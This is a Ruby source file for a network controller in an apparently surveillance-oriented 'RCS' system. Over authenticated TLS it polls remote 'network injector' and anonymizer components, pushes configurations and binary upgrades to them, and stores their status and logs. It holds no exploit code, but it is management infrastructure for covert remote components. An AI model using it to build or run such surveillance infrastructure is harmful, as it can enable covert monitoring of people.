#encoding: utf-8
#
#  Network Controller to update the status of the components in the RCS network
#

# relatives
require_relative 'legacy_protocol'

# from RCS::Common
require 'rcs-common/trace'

# system
require 'socket'
require 'openssl'
require 'timeout'

module RCS
module Controller

class LegacyNetworkController
  extend RCS::Tracer

  # TODO: check this for release
  # the minimum requested version of a Network Injector in order to work
  MIN_INJECTOR_VERSION = 2014012001
  
  def self.check

    # if the database connection has gone wait for the next heartbeat
    return unless DB.instance.connected?

    # retrieve the lists from the db
    elements = DB.instance.injectors

    # use one thread for each element
    threads = []

    # keep only the elements to be polled
    elements.delete_if {|x| x['poll'] == false}

    # nothing to be done...
    return if elements.empty?

    trace :info, "[NC] Handling #{elements.length} network elements..."

    # contact every element
    elements.each do |p|
      threads << Thread.new do
        status = []
        logs = []
        begin
          # interval check minus 5 seconds is a good compromise for timeout
          # we are sure that the operations will be finished before the next check

          # remove timeout to allow NI upgrade on slow connections
          #Timeout::timeout(Config.instance.global['NC_INTERVAL'] - 5) do
            status, logs = check_element p
          #end

          # send the status to db
          report_status(p, *status) unless status.nil? or status.empty?

          trace :debug, "[NC] #{p['address']} Inserting logs..." unless logs.empty?

          # send the logs to db
          logs.each do |log|
            DB.instance.injector_add_log(p['_id'], *log) if p['type'].nil?
          end

        rescue Exception => e
          trace :debug, "[NC] #{p['address']} #{e.message}"
          #trace :debug, "EXCEPTION: [#{e.class}] " << e.backtrace.join("\n")
          # report the failing reason
          report_status(p, 'ERROR', e.message)
        end

        # make sure to destroy the thread after the check
        #Thread.kill Thread.current
        Thread.exit
      end
    end

    # wait for all the threads to finish
    #threads.each do |t|
    #  t.join
    #end

    #trace :info, "[NC] Network elements check completed"
  end


  def self.check_element(element)
    trace :debug, "[NC] connecting to #{element['address']}:#{element['port']}"

    # socket for the communication
    socket = TCPSocket.new(element['address'], element['port'])

    # ssl encryption stuff
    ssl_context = OpenSSL::SSL::SSLContext.new()
    ssl_context.cert = OpenSSL::X509::Certificate.new(File.read(Config.instance.file('rcs-network.pem')))
    #ssl_context.key = OpenSSL::PKey::RSA.new(File.open("keys/MyCompanyClient.key"))
    ssl_socket = OpenSSL::SSL::SSLSocket.new(socket, ssl_context)
    ssl_socket.sync_close = true

    # connection
    # the exceptions will be caught from the caller
    ssl_socket.connect

    trace :debug, "[NC] #{element['address']} connected"

    # create a new NC protocol
    proto = LegacyProtocol.new(ssl_socket)

    network_signature = DB.instance.network_signature || File.read(Config.instance.file('rcs-network.sig')).strip

    # authenticate with the component
    raise 'Cannot authenticate' unless proto.login(network_signature)

    trace :debug, "[NC] #{element['address']} login"

    result = []
    logs = []
    begin
      # get a command from the component
      command = proto.get_command
      # parse the commands
      case command
        when LegacyProtocol::PROTO_CERT
          trace :info, "[NC] #{element['address']} is requesting the NC Certificate for setup"
          proto.cert

        when LegacyProtocol::PROTO_VERSION
          ver = proto.version
          trace :info, "[NC] #{element['address']} is version #{ver}"

          # update the db accordingly
          DB.instance.update_injector_version(element['_id'], ver) if element['type'].nil?

        when LegacyProtocol::PROTO_CONF
          content = nil
          unless element['configured']
            content = DB.instance.injector_config(element['_id']) if element['type'].nil?
            trace :info, "[NC] #{element['address']} has a new configuration (#{content.length} bytes)" unless content.nil?
          end
          proto.config(content)

        when LegacyProtocol::PROTO_UPGRADE
          content = nil
          if element['upgradable']
            content = DB.instance.injector_upgrade(element['_id']) if element['type'].nil?
            trace :info, "[NC] #{element['address']} has a new upgrade (#{content.length} bytes)" unless content.nil?
            trace :debug, "[NC] #{element['address']} upgrade MD5: #{Digest::MD5.hexdigest(content)}"
          end
          proto.upgrade(content)

        when LegacyProtocol::PROTO_MONITOR
          result = proto.monitor
          trace :info, "[NC] #{element['address']} monitor is: #{result.inspect}"

          # version check for incompatibility (only for injectors)
          if ver.to_i < MIN_INJECTOR_VERSION and element['type'].nil?
            result[0] = 'ERROR'
            result[1] = "Version too old, please update the component."
            trace :info, "[NC] #{element['address']} monitor is: #{result.inspect}"
          end

          # add the version to the results
          result << ver

        when LegacyProtocol::PROTO_LOG
          time, type, desc = proto.log
          # we have to be fast here, we cannot insert them directly in the db
          # since it will take too much time and we have to finish before the timeout
          # return the array and let the caller insert them
          logs << [time, type, desc]

        when LegacyProtocol::PROTO_BYE
          trace :info, "[NC] #{element['address']} end synchronization"
          break
      end

    end until command.nil?

    # close the connection
    ssl_socket.close

    trace :debug, "[NC] #{element['address']} disconnected"

    return result, logs
  end

  # Push a config to a network element
  def self.push(anon)
    trace :info, "[NC] PUSHING to #{anon['address']}:#{anon['port']}"

    # contact the anon
    status, logs = nil

    Timeout::timeout(Config.instance.global['NC_INTERVAL'] - 5) do
      status, logs = check_element(anon)
    end

    # send the results to db
    report_status(anon, *status) unless status.nil? or status.empty?
    trace :info, "[NC] PUSHED to #{anon['address']}:#{anon['port']}"

    true
  rescue Exception => e
    msg = "[NC] CANNOT PUSH TO #{anon['address']}: #{e.message}"
    trace(:warn, msg)
    raise(msg)
  end


  def self.report_status(elem, status, message, disk=0, cpu=0, pcpu=0, version=0)

    if elem['type'] == 'remote'
      component = "RCS::ANON::" + elem['name']
      internal_component = 'anonymizer'
    else
      component = "RCS::NIA::" + elem['name']
      internal_component = 'injector'
    end

    message.encode!('UTF-8', 'binary', invalid: :replace, undef: :replace, replace: '')

    trace :info, "[NC] [#{component}] #{elem['address']} #{status} #{message}"

    # create the stats hash
    stats = {:disk => disk, :cpu => cpu, :pcpu => pcpu}

    # send the status to the db
    DB.instance.update_status component, elem['address'], status, message, stats, internal_component, version
  end

end

end #Collector::
end #RCS::